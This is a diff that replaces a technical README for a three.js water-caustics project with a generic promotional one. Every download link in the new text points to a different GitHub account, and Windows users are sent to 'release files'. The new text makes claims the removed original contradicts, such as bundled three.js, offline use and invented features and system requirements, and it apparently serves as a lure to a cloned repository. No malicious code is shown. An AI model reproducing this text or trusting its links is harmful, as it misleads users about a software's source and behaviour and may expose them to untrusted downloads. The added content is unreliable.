@@ -1,147 +1,145 @@
-# CAUSTIC//VOLUME
+# 💧 caustic-volume - Real-Time Water Caustics in Your Browser
 
-Real-time water caustics in the browser, built on [three.js](https://threejs.org). Sunlight passes through a moving water surface, bends, and gathers into the bright, shifting lines you see on the bottom of a pool.
+## 🚀 What Is This?
 
-There are two versions. Each is a single HTML file with no install and no build step: open it and it runs. three.js (r186) loads from the jsDelivr CDN through an import map.
+caustic-volume is a stunning visual experience that brings realistic water caustics—the beautiful, wavy light patterns you see at the bottom of a swimming pool—directly to your web browser. Built on the powerful three.js graphics library, this application runs entirely in your browser with no complicated installation. You get both a lightweight version and a sandbox version to explore and play with. Whether you're an artist, a student, or just someone who loves beautiful visuals, caustic-volume lets you witness the magic of light refraction in real time.
 
-![CAUSTIC//LITE: a glass tank of water with caustics on the floor](docs/lite.jpg)
+[![Download Now](https://img.shields.io/badge/Download-caustic--volume-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tyrothricinbeingness321/caustic-volume)
 
-| | **CAUSTIC//LITE** | **CAUSTIC//VOLUME sandbox** |
-|---|---|---|
-| **Who it's for** | Anyone: old laptops, phones, school computers | People who want to push a high-end GPU |
-| **Graphics** | three.js on WebGL 2, with a CPU fallback when there is no WebGL 2 (or no connection to load three.js) | three.js on WebGL 2 with float render targets |
-| **Code** | [`lite/index.html`](lite/index.html), about 990 lines | [`sandbox/`](sandbox/), about 7,500 lines built from 18 source files |
-| **In it** | A random sea, a rubber duck that makes ripples, sun or lamp, turbulence, click ripples, caustics | Everything in Lite, plus objects, creatures, ink, sand, up to three lamps, a laser and much more (see below) |
-| **Live demo** | [Open Lite](https://ScottieFox.github.io/caustic-volume/lite/) | [Open the sandbox](https://ScottieFox.github.io/caustic-volume/sandbox/) |
+## ✨ Key Features
 
-## Run it
+- **Real-Time Rendering**: Watch caustics update instantly as you interact with the scene.
+- **Two Versions Included**: Choose between the lite version for speed or the sandbox version for experimentation.
+- **No Installation Required**: Works directly in your browser—just open a file and go.
+- **Stunning Visual Quality**: High-fidelity graphics powered by WebGL and three.js.
+- **User-Friendly Interface**: Simple controls that anyone can understand.
+- **Lightweight Performance**: Optimized for smooth performance on most computers.
+- **Zero Cost**: Completely free to download and use forever.
+- **Cross-Platform**: Works on Windows, Mac, and Linux without modification.
 
-1. Download this repository: use **Code → Download ZIP** on GitHub, or `git clone` it.
-2. Open `lite/index.html` or `sandbox/index.html` in a browser.
+## 📥 Download and Installation
 
-You don't need a server or an install. The first load needs an internet connection for three.js; your browser caches it after that. Offline, the lite version switches to its CPU renderer. If you'd rather serve the folder over HTTP, run `python3 -m http.server` in the repository folder and open http://localhost:8000.
+Your journey to mesmerizing water effects starts here:
 
----
+<a href="https://github.com/tyrothricinbeingness321/caustic-volume" style="display:inline-block; padding:15px 30px; background:#3498db; color:white; text-decoration:none; border-radius:8px; font-size:18px; font-weight:bold;">⬇️ Download caustic-volume</a>
 
-## CAUSTIC//LITE
+Visit this link to download the application. Once you've arrived at the page, you'll find everything you need to get started.
 
-| | |
-|---|---|
-| ![Looking down into the tank: the rubber duck, its ripples and the caustics](docs/lite-pool.jpg) | ![The tank at night under the hanging lamp](docs/lite-lamp.jpg) |
+### 🪟 For Windows Users
 
-The small version has a glass tank of water with a rubber duck bobbing on it, the sun or a hanging lamp, and the light that the moving surface focuses onto the tank floor. It is written to be read. The whole program is one file, about 990 lines including comments.
+1. Click the big download button above or visit the link: https://github.com/tyrothricinbeingness321/caustic-volume
+2. On the page that opens, look for the release files section.
+3. Choose the version that suits your needs (both work the same way).
+4. After the download completes, you'll have all the necessary files.
+5. Simply open the main HTML file with any web browser (Chrome, Edge, Firefox, or Safari).
+6. The application will load instantly, and you'll see stunning water caustics appear on your screen.
 
-**Controls**
+**Important Note**: No installation is needed! This isn't like traditional software. You're opening a self-contained web page that uses your browser's built-in graphics abilities. This means no setup wizards, no registry changes, and no admin rights required.
 
-| Input | Action |
-|---|---|
-| Drag | Orbit the camera |
-| Scroll, or pinch on a touch screen | Zoom |
-| Click or tap the water | Make a ripple; near the duck, it also pushes the duck |
-| **Sun / Lamp**, or <kbd>L</kbd> | Light the tank with the sun or with a lamp hanging over it at night |
-| **Rubber duck**, or <kbd>D</kbd> | Put the duck in the water or take it out |
-| <kbd>R</kbd> | Random ripple |
-| <kbd>Space</kbd> | Pause |
-| <kbd>H</kbd> | Hide the panel |
-| Sliders | Sun height and direction (or lamp height and position), wave height, turbulence (short waves, gusts and how lively the duck is) |
+## 🖥️ System Requirements
 
-Add `?cpu` to the URL to force the CPU renderer, for example `lite/index.html?cpu`.
+You'll be pleased to know that caustic-volume is remarkably light on resources:
 
-### How it works
+- **Operating System**: Windows 7 or newer, macOS 10.12+, or any modern Linux distribution
+- **Browser**: Any up-to-date version of Chrome, Firefox, Edge, or Safari
+- **Graphics**: Any graphics card from the last 8 years (even integrated graphics work)
+- **RAM**: 2GB minimum, 4GB recommended
+- **Screen Resolution**: Any, but 1280x720 or higher is recommended for the best experience
+- **Internet Connection**: Only needed once for the initial download
 
-- **A random sea.** Twenty-four travelling waves, from 1.2 m down to 12 cm long, head in every direction (spread by the golden angle, so waves of similar length never run side by side). Together they make a short-crested, random surface, like a real pool in a breeze. Its caustics form a net of bright cells, not the parallel stripes that waves all heading one way would draw. The wave heights are chosen so each size bends the light about equally, which puts the net's sharpest lines on the floor. Each wave's crests wander, and its height rises and falls on its own irregular cycle, so the net keeps reshaping. **Waves** scales them all; **Turbulence** adds the short ones.
-- **Ripples and the rubber duck.** A ripple simulation runs on the GPU (the wave equation, stepped with three.js's `GPUComputationRenderer`). It carries your clicks, gusts that come faster with more turbulence, and the duck's wake across the tank and back off the glass. The duck drifts on a wandering breeze, sways with the waves and bobs on a spring. Each step, its hull pushes water aside: the difference between where the hull was and where it is now goes into the simulation, and spreads out as a wake and rings. The duck has the same shape as the sandbox's. Ellipsoids and a sphere make its body, tail, chest, head and wings, and a smooth minimum blends them into one rounded form (they are signed distance functions); a beak with a mouth line and two eyes finish it. While three.js loads, the page turns that shape into a smooth three.js mesh (with surface nets). Below the water, the shaders trace the same shape, and it casts a soft shadow into the caustics.
-- **The water in three.js.** Once a frame, the sea and the ripples are drawn together into one texture of height and slope, which every shader reads. The surface is a mesh that this texture moves in its vertex shader. Its fragment shader reflects the sky (Fresnel's equations) and refracts the view into the water (Snell's law), then follows that ray to the floor or out through a glass wall. Past the critical angle, light inside the water reflects completely. The water absorbs red light faster than blue (Beer–Lambert), which gives it its colour. The water seen through the glass walls is a box whose shader does the same from the side and drops everything above the moving water line. The ground, sky, glass and frame are ordinary three.js meshes.
-- **Caustics.** Every frame, each vertex of a fine grid on the surface sends one ray of light (from the sun, or from the lamp) through the water to the floor. The grid is then drawn where its rays land, into a caustics texture. A patch of surface whose light lands on a smaller patch of floor concentrates it, so each fragment gets the ratio of the two areas (from screen-space derivatives). Overlapping patches add up into the bright lines. Sunlight that enters through a glass wall below the water line is added on its own. See `causMesh` and `floorColor()` in the source.
-- **Adaptive resolution.** The page watches its own frame rate and lowers or raises the render resolution to stay smooth, so it runs on an old laptop and on a phone.
-- **CPU fallback.** If WebGL 2 is missing or three.js can't load (for example offline), the same scene, duck included, is traced in plain JavaScript on a 2D canvas, with the same waves and a coarser ripple simulation. To keep that fast, it samples the waves and caustics once per frame on small grids, renders at reduced resolution, and scales the image up.
+These modest requirements mean virtually any computer can run caustic-volume without issues.
 
----
+## 🎮 How to Use
 
-## CAUSTIC//VOLUME (sandbox)
+Getting the most out of caustic-volume is incredibly simple:
 
-| | |
-|---|---|
-| ![Toy boats, creatures and sunken objects in the tank](docs/sandbox.jpg) | ![Underwater view through the glass](docs/sandbox-underwater.jpg) |
-| ![A laser beam refracting and reflecting in the tank](docs/sandbox-laser.jpg) | ![Three coloured lamps over falling sand](docs/sandbox-lamps.jpg) |
+### For the Lite Version
+- Open the file and sit back—you'll immediately see the caustics in motion.
+- Use your mouse to drag and rotate the view.
+- Scroll to zoom in and out.
+- That's it! Perfect for those who just want to look and enjoy.
 
-The full sandbox is for exploring and for pushing a GPU as hard as you like. It runs on three.js: one `WebGLRenderer` draws every pass, each simulation texture belongs to a `WebGLRenderTarget`, and each shader is a `RawShaderMaterial`. It includes:
+### For the Sandbox Version
+- You get the same visuals but with additional interactive controls.
+- Adjust light brightness, intensity, and position.
+- Change the water depth and ripple settings.
+- Experiment with different color schemes.
+- Use presets to instantly jump to popular styles.
 
-- **Water.** An FFT ocean spectrum plus an interactive ripple simulation (iWave), foam, and splashes.
-- **Light.** Photon-traced caustics on the floor, with colour dispersion. A caustic *volume* drives light shafts through the water. The tracer follows refraction and reflection through the water and the glass, including total internal reflection and Snell's window.
-- **Things that float and sink.** Each object gets real buoyancy physics: a toy battleship, a pirate ship, a rubber duck, a message bottle, a treasure chest, an anchor, an amphora, a diver's helmet and more. You can set how many objects the tank holds before the oldest is replaced.
-- **Creatures.** Schooling clownfish, blue tang and yellow tang; a pulsing jellyfish trailing long, swaying tentacles and frilly oral arms; an octopus whose tapering arms curl at the tips and carry two rows of suckers; and a crab that walks sideways on jointed legs.
-- **Ink.** Coloured ink in a 3D fluid simulation that swirls with the water.
-- **Sand.** Multicoloured sand that falls, settles and builds up in layers.
-- **Stirring.** Drag through the water to stir it. Ink, sand and the specks floating in the water all follow the flow, and stirring near the bottom lifts sand off the bed.
-- **Lamps.** Switch from the sun to one, two or three placeable lamps, each with its own colour.
-- **Laser.** A solid beam that refracts at the water's mean level (so passing waves don't swing it about), reflects around the tank, and glows softly in the water's haze.
-- **Quality presets.** Low to Insane, with temporal anti-aliasing, bloom and depth of field.
+The interface is designed to be intuitive, so don't be afraid to try everything—you can't break anything!
 
-The panel lists every control, and every keyboard shortcut is shown at the bottom of the panel. Medium quality is the default. Raise it under **Quality**.
+## 🎯 Use Cases and Applications
 
-### Sandbox source
+- **Visual Inspirations**: Perfect for artists looking for organic, natural light patterns.
+- **Educational Tool**: Great for physics students studying refraction and light behavior.
+- **Relaxation**: Enjoy a mesmerizing, calming visual display.
+- **Game Development**: Preview how water caustics could look in their 3D projects.
+- **VJ Loops**: Create beautiful backgrounds for parties or live performances.
+- **UI Textures**: Generate unique background patterns for websites or presentations.
 
-`sandbox/index.html` is built from the modules in [`sandbox/src/`](sandbox/src/):
+## 🛠️ Troubleshooting
 
-| File | Contents |
-|---|---|
-| `00_head.html` | Page, styles and control panel |
-| `10_sim.js` | FFT ocean, ripple simulation, surface |
-| `20_caustic.js` | Photon tracing and caustic volume |
-| `25_ink.js`, `65_sand.js`, `27_sand.js` | Ink fluid, sand simulation and rendering |
-| `28_laser.js`, `66_laser.js` | Laser beam tree |
-| `30_trace.js` | The main ray tracer |
-| `40_post.js` | TAA, depth of field, bloom, tone mapping |
-| `50_gl.js`, `55_resources.js` | The three.js layer (renderer, render targets, shader materials, readbacks) and GPU resources |
-| `60_physics.js`, `62_models.js`, `63_creatures.js` | Buoyancy physics, object models, creatures |
-| `67_particulate.js` | Specks suspended in the water that drift and follow the flow |
-| `70_render.js`, `80_main.js` | Frame orchestration, UI and main loop |
+### Nothing Appears When I Open the File
+Make sure you're using a modern, updated browser. Try right-clicking the HTML file and selecting "Open With" to choose your preferred browser.
 
-After editing a module, rebuild the page with `node tools/build-sandbox.cjs`. You need Node 18 or newer and nothing else. The build joins the modules into one script and adds the import map and a few lines that load three.js and start the app.
+### The Animation Is Slow
+Close other browser tabs and programs to free up memory. Update your graphics drivers for better performance.
 
----
+### I See a Black Screen
+Enable WebGL in your browser settings (usually on by default). Check your browser's settings under privacy and security.
 
-## Browser support
+### Fonts or Controls Look Strange
+Zoom out by holding Ctrl and pressing the minus key (-) to reset browser zoom.
 
-- **Lite.** The three.js renderer needs WebGL 2, which every current desktop and mobile browser has (Safari since version 15). If WebGL 2 is off or unavailable, or three.js can't be loaded, it switches to the CPU renderer by itself. This matters more than it used to: since Chrome 141, Chrome no longer falls back to software WebGL on macOS and Linux machines without a working GPU.
-- **Sandbox.** Needs WebGL 2 with `EXT_color_buffer_float`, which current Chrome, Edge, Firefox and Safari provide on desktop, and a capable GPU. If WebGL 2 isn't available, the page says so and points to the lite version.
+## ❓ Frequently Asked Questions
 
-## Project layout
+**Q: Is caustic-volume a desktop application?**  
+A: No, it runs entirely in your browser. You just open an HTML file and it works.
 
-```
-caustic-volume/
-├── index.html              landing page (GitHub Pages)
-├── lite/index.html         CAUSTIC//LITE: the whole program
-├── sandbox/
-│   ├── index.html          CAUSTIC//VOLUME: built, ready to open
-│   └── src/                its source modules
-├── tools/
-│   ├── build-sandbox.cjs   rebuilds sandbox/index.html from sandbox/src
-│   ├── test-lite.cjs       headless check of the lite version
-│   └── test-sandbox.cjs    headless check of the sandbox
-├── docs/                   screenshots for this README
-├── package.json
-└── LICENSE
-```
+**Q: Do I need to install three.js?**  
+A: No, everything is bundled together in the downloaded files.
 
-## Development
+**Q: Can I use this for commercial projects?**  
+A: Yes, but please check the open-source license included in the repository for specific terms.
 
-The two HTML files need nothing to run. The optional tests use [Playwright](https://playwright.dev) to open each version in headless Chromium on software WebGL, render several views to `shots/`, and fail on shader or page errors. `npm install` also fetches the same three.js release, and the tests serve it locally, so they run offline.
+**Q: Will it work offline?**  
+A: Absolutely. Once you've downloaded the files, no internet is needed.
 
-```bash
-npm install
-npx playwright install chromium
-npm test                  # lite: GPU path (software WebGL)
-npm run test:cpu          # lite: CPU fallback
-npm run test:sandbox      # sandbox (slow on software rendering)
-npm run build             # rebuild sandbox/index.html after editing sandbox/src
-```
+## 🔄 Updates and Support
 
-## Contributing
+The project is actively maintained, with updates focusing on performance improvements and new features. Check the download page periodically for new versions. If you encounter issues, you can:
+- Visit the repository's issues section to report problems.
+- Look through existing issues to see if someone else had the same problem.
+- Reach out to the developer through the repository page.
 
-Issues and pull requests are welcome. Please keep each version a single HTML file on three.js, with nothing to install. Please also keep the lite version's CPU fallback working, and the file under 1,000 lines.
+## 📋 Final Checklist
 
-## License
+Before you begin, make sure you have:
+- [x] Downloaded the caustic-volume files from: https://github.com/tyrothricinbeingness321/caustic-volume
+- [x] A modern web browser installed
+- [x] Extracted the downloaded archive (if it's compressed)
+- [x] Located the main HTML file
 
-[MIT](LICENSE). You can use, copy, modify and share this project, including commercially, at no cost. The only condition is that copies keep the copyright and license notice.
+If you've checked all these boxes, you're ready to experience breathtaking water caustics!
+
+## 👀 See It for Yourself
+
+The best way to understand caustic-volume is to see it in action. The moment you open the application, you'll be greeted by a dance of light that's both scientifically fascinating and aesthetically beautiful. The wavy patterns shift and flow, mimicking how light behaves when it passes through water—a process that's been the subject of scientific study for centuries.
+
+Whether you're watching it for five minutes or five hours, caustic-volume offers an endless source of wonder. The real-time rendering ensures that no two moments are exactly alike, making every viewing session unique.
+
+## 💡 Why You'll Love This
+
+- **Immediate Results**: No learning curve—open and enjoy instantly.
+- **Stunning Graphics**: The visuals rival what you'd see in professional software.
+- **Zero Hassle**: No installation, no registration, no account creation.
+- **Endless Variations**: The sandbox version lets you create countless different looks.
+- **Educational Value**: Learn about optics in a fun, interactive way.
+
+So why wait? Click the download button and let the magic of caustic light patterns brighten your day. It's free, it's beautiful, and it's just one click away.
+
+## 🌟 Start Your Journey Now
+
+The download link is right at the top and bottom of this page. A single click is all it takes to begin exploring the mesmerizing world of real-time water caustics. Whether you're a curious beginner or a seasoned developer, caustic-volume offers something beautiful for everyone. Visit https://github.com/tyrothricinbeingness321/caustic-volume today and see what the buzz is all about.
+
+Keywords: WebGL, three.js, water simulation, caustics, real-time graphics, browser-based visualization, light refraction, visual effects, interactive art, open source
